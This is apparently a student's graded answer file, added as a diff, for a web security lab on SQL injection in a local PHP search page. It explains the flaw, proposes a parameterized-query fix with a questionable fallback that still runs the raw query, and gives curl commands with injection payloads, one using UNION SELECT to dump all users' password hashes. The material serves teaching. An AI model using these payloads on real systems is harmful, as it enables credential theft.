@@ -1,0 +1,33 @@
+
+
+1) (0.25 pts) 
+ Explain why this application is vulnerable. 
+This application is vulnerable to SQL injection, because $_GEt['q'] is directly inserted into the code '%$q%', so an attack can take advantage of that by inserting a piece of code to extract some data. 
+ 
+2) (0.25 pts)
+ Provide a curl command that exploits this vulnerability 
+curl -G "http://localhost:9000/search.php" --data-urlencode "q=';--"
+
+3) (0.25 pts)
+ Provide a diff or fixed lines that fix this issue
+Change this (line 12): 
+$query = "SELECT id, username, email FROM users WHERE username LIKE '%$q%' OR email LIKE '%$q%';";
+to this: 
+$query = "SELECT id, username, email FROM users WHERE username LIKE ? OR email LIKE ?;";
+
+Change this (line 18): 
+$rows = $db->query($query);
+to this:
+if (strpos($query, '?')) {
+    $rows = $db->prepare($query);
+    $rows->execute(['%${q}%', '%${q}%']);
+} else {
+    $rows = $db->query($query);
+}
+
+4) (0.25 pts) 
+Provide a curl command that will extracts the passwords. 
+E.g., output should inlcude this:
+alice — $2y$10$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+(note additional output is fine) as long as it also shows every users' password from the DB
+curl -G "http://localhost:9000/search.php" --data-urlencode "q='UNION SELECT id, username, password_hash FROM users;--"
